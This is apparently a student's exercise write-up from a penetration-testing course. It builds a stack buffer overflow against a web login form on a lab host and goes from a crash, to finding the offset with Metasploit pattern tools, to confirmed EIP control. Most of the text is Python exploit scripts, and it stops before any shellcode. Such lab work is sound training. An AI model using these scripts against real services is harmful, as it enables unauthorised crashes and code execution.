### 11.2.3.1 Exercises
#### 1. Write a standalone script to replicate the crash.

Since I know it crashed at 800 bytes, I just set the input to 800 bytes to replicate the crash in the PoC

```python
#!/usr/bin/python
import socket
try:        
        print "\nSending evil buffer..."

        size = 800

        inputBuffer = "A" * size

        content = "username=" + inputBuffer + "&password=A"

        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.216.10\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://192.168.216.10/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"

        buffer += content

        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        
        s.connect(("192.168.216.10", 80))
        s.send(buffer)
        
        s.close()
        print "\Done!"
except:
        print "\nCould not connect!"
```

![image-20200703194428197](.11.2.3.1.assets/image-20200703194428197.png)

![image-20200703194446559](.11.2.3.1.assets/image-20200703194446559.png)

#### 2. Determine the offset within the input buffer to successfully control EIP.

Created 800byte unique pattern

`msf-pattern_create -l 800`

Inserted into original PoC:

```python
#!/usr/bin/python
import socket

try:        
    print "\nSending evil buffer....."

    inputBuffer = ""

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.216.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.216.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        
    s.connect(("192.168.216.10", 80))
    s.send(buffer)
        
    s.close()
    print "\Done!"
except:
    print "\nCould not connect!"
```

Ran code & caused overflow

![image-20200703194745901](.11.2.3.1.assets/image-20200703194745901.png)

![image-20200703195114581](.11.2.3.1.assets/image-20200703195114581.png)

Searched for string with MSF

`msf-pattern_offset -l 800 -q 42306142`

![image-20200703230722576](.11.2.3.1.assets/image-20200703230722576.png)

#### 3. Update your standalone script to place a unique value into EIP to ensure your offset is correct.

Crafted payload with 780 bytes of padding, then my 4 byte string of BBBB

```python
#!/usr/bin/python
import socket

try:        
    print "\nSending evil buffer....."

    filler = "A" * 780
    eip  = "B" * 4
    ending = "C" * 16
    inputBuffer = filler + eip + ending

    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.216.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.216.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        
    s.connect(("192.168.216.10", 80))
    s.send(buffer)
        
    s.close()
    print "\Done!"
except:
    print "\nCould not connect!"

```

Executed script:

![image-20200703230930055](.11.2.3.1.assets/image-20200703230930055.png)

Successfully obtained EIP control:

![image-20200703231006372](.11.2.3.1.assets/image-20200703231006372.png)